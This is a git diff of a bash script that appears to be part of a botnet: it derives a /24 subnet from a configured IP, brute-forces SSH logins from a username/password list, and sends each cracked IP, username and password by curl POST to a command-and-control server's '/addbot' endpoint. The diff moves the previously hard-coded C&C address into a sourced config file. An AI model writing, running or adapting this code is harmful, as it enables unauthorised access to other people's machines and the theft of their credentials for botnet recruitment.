@@ -1,16 +1,12 @@
 #!/bin/bash
 
+source ../.config
+
 rm userPassIPFile.txt
 
-if [ $# -le 0 ]
-then
-	echo "please enter the IP ID in the form of x.x.x"
-	echo "this program handles only /24 subnet values"
-	exit 0
-fi
 
 val=""
-echo $1 > temp.txt
+echo $destIP > temp.txt
 val=$(grep -E "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" temp.txt)
 ip=$(grep -ohE "([0-9]{1,3}\.){3}" temp.txt)
 echo $ip
@@ -50,7 +46,6 @@ sshTry()
 	IFS=','
 	uname=""
 	pass=""
-	cnc=192.168.29.74:5000
 
 	[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
 	while read username password
@@ -76,7 +71,7 @@ sshTry()
 		echo ""
 		exit 0
 	fi
-	curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc/addbot
+	curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc:$port/addbot
 	echo "$val" >>$OUTPUTFILE
 	echo "$val added"
 }
